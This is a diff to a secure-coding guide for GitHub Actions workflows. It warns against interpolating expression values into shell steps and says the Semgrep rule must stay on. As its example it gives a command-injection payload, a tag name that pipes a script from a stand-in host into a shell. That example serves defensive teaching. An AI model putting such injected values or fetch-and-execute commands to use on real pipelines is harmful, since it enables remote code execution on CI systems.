@@ -28,6 +28,6 @@
 - **Never interpolate `${{ }}` into a `run:` block.** Pass the value through `env:`
   and read it as a shell variable. Anything derived from a branch name, tag, title
   or comment is attacker-supplied text, and interpolation pastes it into the script
-  before bash ever sees it — a tag named `'; curl evil.sh | sh; '` executes.
+  before bash ever sees it: a tag named `'; curl evil.sh | sh; '` executes.
 - Semgrep enforces both of the above, and caught both in this repo's own first
   workflow. If it fires on the CI config, fix the config; do not silence the rule.
